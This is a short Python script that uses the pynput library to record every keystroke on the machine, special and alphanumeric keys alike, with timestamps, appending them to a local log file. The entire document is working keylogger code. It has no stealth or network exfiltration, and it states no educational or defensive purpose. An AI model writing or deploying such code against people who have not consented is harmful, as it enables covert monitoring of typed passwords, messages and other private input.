import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

# Event handler for pressing the keyboard.
def on_press(key):

    # Get the formatted string of current time.
    current_time = datetime.now()
    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")

    # Log the pressed key.
    with open("log_file.txt", "a") as f:
        if type(key) == pynput.keyboard.Key:
            f.write("{}, special key: {}\n".format(formatted_time, str(key)))
        elif type(key) == pynput.keyboard.KeyCode:
            f.write("{}, alphanumeric key: {}\n".format(formatted_time, key.char))
        else:
            f.write("{}: unknown key...".format(formatted_time))

# Event handler for releasing the keyboard.
def on_release(key):
    pass

# Listener for keys pressed and released.
# Use listener.join() Keep the listener running until we break out.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
